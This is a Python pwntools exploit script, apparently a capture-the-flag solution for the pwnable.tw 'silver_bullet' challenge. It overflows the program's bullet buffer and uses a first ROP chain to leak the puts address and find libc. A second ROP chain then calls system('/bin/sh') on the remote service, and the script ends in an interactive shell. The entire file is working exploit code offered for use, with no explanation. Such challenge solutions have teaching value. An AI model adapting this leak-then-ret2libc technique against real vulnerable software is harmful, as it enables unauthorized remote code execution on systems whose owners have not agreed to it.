from pwn import *

elf = ELF('./silver_bullet')
libc = ELF('./libc_32.so.6')

context.binary = elf

r = remote('chall.pwnable.tw', 10103)

## =========================================
## Some utilities to work with the given CLI
## =========================================
def power_up(d):
    r.recvuntil(b' :')
    r.write(b'2')
    r.recvuntil(b' :')
    r.write(d)
    skip_menu()

def create_bullet(d):
    r.recvuntil(b' :')
    r.write(b'1')
    r.recvuntil(b' :')
    r.write(d)
    skip_menu()

def skip_menu():
    r.recvuntil(b'+++++++++++++++++++++++++++')
    r.recvuntil(b'+++++++++++++++++++++++++++')
    r.recvuntil(b'+++++++++++++++++++++++++++')

def beat():
    r.recvuntil(b' :')
    r.write(b'3')


## =========================================
## First, retrieve the LIBC address
## =========================================
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])
rop.call('main')

create_bullet('A' * 0x2F)
power_up(b'A')
power_up(b'A' * 7 + bytes(rop))

beat()
skip_menu()
beat()

r.recvuntil(b'!!\x0a')
ADDR_PUTS = u32(r.recv(4))

LIBC_BASE = ADDR_PUTS - libc.symbols['puts']

info("LIBC_BASE = {}".format(hex(LIBC_BASE)))

## =========================================
## Now, try to execute system("/bin/sh")
## =========================================
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

rop = ROP(elf)
rop.call(ADDR_SYSTEM, [ADDR_BINSH])

create_bullet(b'A' * 0x2F)
power_up(b'A')
power_up(b'A' * 7 + bytes(rop))

print(rop.dump())

beat()
skip_menu()
beat()

r.interactive()
